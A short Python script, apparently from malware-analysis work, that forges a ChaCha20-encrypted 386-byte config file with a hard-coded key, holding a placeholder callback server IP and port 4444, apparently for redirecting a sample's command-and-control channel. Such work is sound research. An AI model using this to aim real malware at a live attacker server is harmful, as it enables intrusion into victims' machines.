#!/usr/bin/env python3
import os
import socket

# Install with "pip install pycryptodome"
from Cryptodome.Random import get_random_bytes
from Cryptodome.Cipher import ChaCha20

ENC_KEY		= b'S\x14=#\x94x\xa9h/h\xc9\xa2\x1a\x93<[9R-\x1d\xe0cY\x1c0D\xa2j*?\xa2\x95'
SERVER_IP 	= '<SERVER_IP>'
SERVER_PORT = 4444
CONFIG_LEN  = 386 
PATH 		= '.'

def main():

	# Nonce according to RFC7539.
	nonce = get_random_bytes(12) 
	ip_as_bytes = socket.inet_aton(SERVER_IP)
	
	# Creating Config according to its structure. ommiting any additional IP or used information.
	# Nulls are added because Config is checked to be exactly 386 bytes long
	unencrypted_config = b'\x00' * 260 +  ip_as_bytes + SERVER_PORT.to_bytes(2, 'big') + b'\x00' * 106 
	chacha_encryptor = ChaCha20.new(key=ENC_KEY, nonce=nonce)
	ciphertext = chacha_encryptor.encrypt(unencrypted_config)
	encrypted_config = nonce + CONFIG_LEN.to_bytes(2, 'big') + ciphertext
	
	with open(os.path.join(PATH, 'conf'), 'wb') as conf_file:
		conf_file.write(encrypted_config)

if __name__ == '__main__':
	main()
	
